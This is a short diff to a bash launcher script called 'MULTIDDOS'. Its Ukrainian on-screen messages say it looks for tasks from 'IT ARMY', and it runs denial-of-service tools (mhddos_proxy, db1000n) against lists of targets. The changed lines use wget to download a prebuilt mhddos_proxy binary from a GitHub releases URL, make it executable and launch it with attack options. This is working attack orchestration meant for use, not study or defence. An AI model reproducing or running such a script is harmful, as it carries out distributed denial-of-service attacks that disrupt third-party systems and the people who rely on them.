@@ -65,9 +65,6 @@ toilet -t --metal " MULTIDDOS"
 
 if [[ $mhddos_mode == "new" ]]; then
     typing_on_screen 'Шукаю завдання від IT ARMY...' && sleep 2&
-    cd ~/multidd/
-    wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
-    chmod +x mhddos_proxy_linux
 else
     typing_on_screen 'Шукаю завдання...' ; sleep 0.5
     echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
@@ -115,7 +112,7 @@ tmux attach-session -t multidd
 
 while [ "$1" != "" ]; do
     case $1 in
-        +d | --db1000n )   db1000n="on"; shift ;;
+        +d | --db1000n ) db1000n="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         --XS ) export ddos_size="XS"; shift ;;
@@ -141,8 +138,10 @@ cat > auto_bash.sh << 'EOF'
 
 if [[ $mhddos_mode == "new" ]]; then
     echo "!!!NEW MODE!!!"
-    sleep 5
+    sleep 1
     cd ~/multidd/
+    wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
+    chmod +x mhddos_proxy_linux
 
     if [[ $ddos_size == "AUTO" ]]; then
         ./mhddos_proxy_linux --copies auto $args_to_pass
